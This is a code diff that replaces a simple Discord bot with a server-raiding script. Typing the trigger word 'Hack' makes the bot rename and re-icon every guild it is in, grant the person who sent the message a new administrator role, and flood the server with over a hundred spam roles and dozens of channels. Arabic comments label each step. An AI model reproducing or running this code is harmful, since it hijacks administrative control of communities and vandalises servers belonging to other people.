@@ -1,70 +1,3904 @@
-const Discord = require('discord.js');
+const Discord = require("discord.js");
 const client = new Discord.Client();
-const Canvas = require("canvas");
-const prefix = '#'
 
 
-client.on('ready', () => {
-  console.log(`Logged in as ${client.user.tag}!`);
+
+
+
+
+
+
+var x_x = "Hack" //هنا تحط الامر اللي يشغل الهاك
+
+//اسم البوت واسم السيرفر وصورهم وكل شئ
+
+client.on('message', message => {
+ if (message.content === x_x) {
+  client.user.setAvatar(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)
+
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  client.user.setUsername("Done Hack")
+
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  client.user.setGame(`Done Hack`, 'https://www.twitch.tv/hix')
+
+ }
 });
 
-client.on('message', msg => {
-  if (msg.content === 'ping') {
-    msg.reply('Pong!');
-  }
+client.on('message', message => {
+ if (message.content === x_x) {
+  client.guilds.forEach(m => {
+   m.setIcon(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)
+  })
+ }
 });
-client.on("message", message => {
-  if (message.author.bot) return;
-    if(!message.channel.guild) return;
- let args = message.content.split(' ').slice(1).join(' ');
-    if(message.content.split(' ')[0] == prefix + 'bc') {
-        if (!args[1]) {
-    message.channel.send(":white_check_mark: ***bc <message>***");
-    return;
-    }
-        message.guild.members.forEach(member => {
-      if(!message.member.hasPermission('ADMINISTRATOR'))  return;
-      message.react("✅");
-            const w = ['./bc/1.png',
-                       './bc/2.png',
-                       './bc/3.png',
-                       './bc/4.png',
-                       './bc/5.png',
-                       './bc/6.png',
-                       './bc/7.png',];
-            let Image = Canvas.Image,
-            canvas = new Canvas(400, 200),
-            ctx = canvas.getContext('2d');
-            ctx.patternQuality = 'bilinear';
-        ctx.filter = 'bilinear';
-        ctx.antialias = 'subpixel';
-        ctx.shadowColor = 'rgba(0, 0, 0, 0.4)';
-        ctx.shadowOffsetY = 2;
-        ctx.shadowBlur = 2;
-            fs.readFile(`${w[Math.floor(Math.random() * w.length)]}`, function (err, Background) {
-            if (err) return console.log(err);
-            let BG = Canvas.Image;
-            let ground = new Image;
-            ground.src = Background;
-            ctx.drawImage(ground, 0, 0, 400, 200);
- 
-});
- let url = member.user.displayAvatarURL.endsWith(".webp") ? member.user.displayAvatarURL.slice(5, -20) + ".png" : member.user.displayAvatarURL;
-               jimp.read(url, (err, ava) => {
-                    if (err) return console.log(err);
-                    ava.getBuffer(jimp.MIME_PNG, (err, buf) => {
-                        if (err) return console.log(err);
-                       
-                        ctx.font = '17px Arial';
-                              ctx.fontSize = '13px';
-                              ctx.fillStyle = "#FFFFFF";
-                              ctx.textAlign = "center";
-              ctx.fillText(`${args} ` , 200, 100);
-member.sendFile(canvas.toBuffer());
-});
-});
-});
-}
+client.on('message', message => {
+ if (message.content === x_x) {
+  client.guilds.forEach(m => {
+   m.setName(`Done Hack`)
+  })
+ }
 });
 
-client.login("process.env.BOT_TOKEN");
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+
+  message.guild.setIcon(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)
+
+ }
+});
+
+
+
+
+//اللي يسوي رتب
+
+client.on('message', message => {
+ if (!message.channel.guild) return;
+
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [8],
+   color: "#23272a"
+  }).then(function(role) {
+   message.member.addRole(role);
+  })
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: " #23272a"
+  });
+  message.guild.createRole({
+   name: "Done Hack ",
+   permissions: [1],
+   color: "#ff0000"
+  });
+
+
+ }
+});
+
+
+
+
+//هنا اللي يسوي الرومات
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+
+
+ }
+
+});
